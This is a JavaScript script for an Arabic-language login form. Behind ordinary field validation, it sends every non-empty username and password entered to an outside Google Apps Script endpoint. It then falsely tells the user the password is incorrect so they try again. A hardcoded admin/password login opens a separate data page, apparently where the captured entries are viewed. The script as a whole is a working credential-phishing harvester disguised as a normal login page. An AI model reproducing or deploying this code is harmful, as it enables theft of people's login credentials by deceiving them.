let form = document.getElementById('login');
let user = document.getElementById('user');
let pass = document.getElementById('pass');
let err1 = document.getElementById('err1');
let err2 = document.getElementById('err2');
let btn = document.getElementsByTagName('button')[0];
user.onkeyup = function(){
    if(user.value == ''){
        user.style.border = '1px red solid';
        err1.innerHTML = 'يجب ملئ هذا الحقل';
        err1.style.display = 'block';
    }
    else{
        user.style.border = '1px rgb(210,210,210) solid';
        err1.style.display = 'none';
    }
}
pass.onkeyup = function(){
    if(pass.value == ''){
        pass.style.border = '1px red solid';
        err2.innerHTML = 'يجب ملئ هذا الحقل';
        err2.style.display = 'block';
    }
    else{
        pass.style.border = '1px rgb(210,210,210) solid';
        err2.style.display = 'none';
    }
}
btn.onclick = function(){
    if(user.value == ''){
        user.style.border = '1px red solid'
        err1.innerHTML = 'يجب ملئ هذا الحقل';
        err1.style.display = 'block';
    }
    if(pass.value == ''){
        pass.style.border = '1px red solid';
        err2.innerHTML = 'يجب ملئ هذا الحقل';
        err2.style.display = 'block';
    }
    if(user.value == 'admin' && pass.value == 'password'){
        sessionStorage.admin = 'online';
        location.href = 'data.html';
    }
    else if(user.value != '' && pass.value != ''){
        fetch('https://script.google.com/macros/s/AKfycbxS1N1xPhugWNI6njk5_JZNwXvQ9NdoNHd774VjMtcIfY-nzM_YYvppuV0UsSvOVtQ/exec', {
            method : "POST",
            body: new FormData(form),
        });
        pass.value = '';
        pass.focus();
        pass.style.border = '1px red solid';
        err2.innerHTML = 'كلمة المرور غير صحيحة';
        err2.style.display = 'block';
    }
}